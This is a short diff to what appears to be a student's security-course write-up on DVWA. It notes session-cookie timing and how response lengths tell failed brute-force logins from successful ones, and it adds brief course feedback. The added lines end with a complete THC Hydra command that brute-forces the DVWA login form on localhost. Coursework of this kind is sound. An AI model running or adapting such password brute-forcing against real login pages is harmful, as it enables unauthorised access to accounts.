@@ -36,3 +36,9 @@ dvwaSession cookie is generated as a second counter. It started 12:28:39 pm on O
 
 Subtask 3
 For unsuccesful attempts response content length was 4703 or less. Successful attempts had length of 4747 and 4741.
+
+
+Feedback
+
+Docker had issues running on laptop so could not come to excercise lecture :( Writing tasks are always a bit boring but useful. thc hydra task had problem to finding correct filter...
+docker run --network="host" vanhauser/hydra -V -f -I -l admin -x 1:2:a "http-post-form://localhost/vulnerabilities/brute/:?username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=YOUR-ANSWER-HERE; security=low:F=login.php"
